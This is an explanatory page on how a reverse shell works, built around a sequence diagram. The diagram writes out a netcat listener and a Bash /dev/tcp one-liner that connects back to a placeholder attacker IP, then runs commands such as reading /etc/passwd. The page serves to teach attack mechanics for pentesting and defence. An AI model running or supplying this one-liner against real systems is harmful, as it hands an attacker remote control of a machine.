# Reverse Shell — Attacker Listener, Target Connects Back

```mermaid
sequenceDiagram
    participant Attacker as Attacker Machine<br/>(Public IP / C2 Server)
    participant Target as Target Machine<br/>(Victim / Behind NAT)
    participant Firewall as Firewall / NAT

    Note over Attacker: Step 1: Start listener
    Attacker->>Attacker: nc -lvnp 4444
    Note over Attacker: Listening on 0.0.0.0:4444

    Note over Target: Step 2: Target executes payload
    Target->>Target: bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
    Target->>Firewall: Step 3: Outbound TCP connection to Attacker:4444
    Note over Firewall: Outbound connections<br/>usually allowed
    Firewall->>Attacker: Step 4: TCP connection passes through

    Note over Attacker: Step 5: Connection accepted
    Attacker->>Target: TCP connection established
    Note over Attacker,Target: Interactive shell session begins

    loop Shell Interaction
        Attacker->>Target: Commands: whoami, ls, id, cat /etc/passwd
        Target-->>Attacker: STDOUT / STDERR output
    end

    Note over Attacker: Step 6: Privilege escalation / persistence
    Note over Target: Step 7: Cleanup / cover tracks (optional)
```

A reverse shell is a technique where the target machine initiates an outbound connection back to the attacker's machine, bypassing firewalls and NAT rules that typically block inbound connections. **Step 1 — Listener Setup**: The attacker sets up a listener on their machine using a tool like Netcat (`nc -lvnp 4444`) or Metasploit's multi/handler. This listener binds to a port and waits for an incoming connection. **Step 2 — Payload Execution**: The attacker delivers a payload to the target via phishing, exploitation, or social engineering. Common one-liners include Bash `/dev/tcp`, Python (`pty.spawn`), PowerShell, or compiled binaries. **Step 3-4 — Outbound Connection**: The target's payload initiates an outbound TCP connection to the attacker's IP and port. Because most firewalls allow outbound traffic by default (originally intended for legitimate web browsing, DNS, etc.), this often succeeds. **Step 5 — Shell Session**: Once the connection is established, the attacker's Netcat listener binds the target's input/output streams to a shell (`/bin/sh` or `cmd.exe`). The attacker can now send commands to the target and receive output as if sitting at the target's terminal. **Step 6-7 — Post-Exploitation**: The attacker typically performs privilege escalation, lateral movement, data exfiltration, and establishes persistence before cleaning up logs. Reverse shells are preferred over bind shells in modern pentesting because they bypass inbound firewall rules and NAT without requiring port forwarding.
